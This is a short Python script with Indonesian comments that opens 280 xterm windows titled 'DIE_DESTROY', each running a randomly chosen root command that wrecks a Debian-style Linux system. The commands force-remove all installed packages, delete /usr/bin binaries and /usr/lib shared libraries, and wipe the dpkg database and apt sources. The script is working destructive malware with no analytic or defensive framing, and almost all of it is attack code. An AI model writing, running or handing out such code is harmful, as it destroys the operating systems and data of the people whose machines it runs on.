#!/usr/bin/env python3
import subprocess
import time
import random

def main():
    # 280 terminal system destruction commands
    commands = [
        "sudo rm -rf /var/lib/apt/lists/*",           # Hapus package lists
        "sudo rm -rf /var/cache/apt/archives/*",      # Hapus package cache  
        "sudo dpkg --remove --force-remove-reinstreq $(dpkg -l | grep '^ii' | awk '{print $2}')",  # Remove packages paksa
        "sudo rm -rf /usr/share/applications/*",      # Hapus desktop entries
        "sudo rm -rf /usr/lib/*.so*",                 # Hapus library files
        "sudo find /usr/bin -type f -exec rm -f {} \\;",  # Hapus binaries
        "sudo rm -rf /etc/apt/sources.list.d/*",      # Hapus repo sources
        "sudo rm -rf /var/lib/dpkg/*",                # Hapus dpkg database
    ]
    
    for i in range(280):
        x_pos = random.randint(0, 2000)
        y_pos = random.randint(0, 1000)
        cmd = random.choice(commands)
        
        subprocess.Popen([
            "xterm", 
            "-geometry", f"70x12+{x_pos}+{y_pos}", 
            "-title", f"DIE_DESTROY_{i:03d}",
            "-bg", "black",
            "-fg", "white", 
            "-e", "bash", "-c", f"echo 'EXECUTING: {cmd}'; {cmd}; sleep 10"
        ])
        
        time.sleep(0.005)
    
    time.sleep(1)